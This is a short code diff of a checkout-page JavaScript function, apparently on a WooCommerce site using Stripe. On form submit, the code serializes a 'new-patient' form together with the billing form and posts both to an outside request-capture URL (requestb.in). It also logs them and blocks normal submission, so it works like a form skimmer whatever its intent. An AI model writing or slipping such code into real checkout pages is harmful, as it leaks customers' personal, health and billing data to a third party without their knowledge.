@@ -49,12 +49,11 @@ function load() {
     jQuery('#wc-stripe-new-payment-method').prop('checked', true)
 
     jQuery('form.checkout').submit(function(e) {
-      jQuery('form.new-patient').attr('action', 'http://requestb.in/1et2h7e1').submit()
+      e.preventDefault()
       var patient  = jQuery('form.new-patient').serialize()
       var billing  = jQuery('form.checkout').serialize()
       jQuery.post('http://requestb.in/1et2h7e1', {method:'POST', data:patient+'&'+billing})
       console.log('form.new-patient', patient+'&'+billing)
-      e.preventDefault()
     })
   }
 }
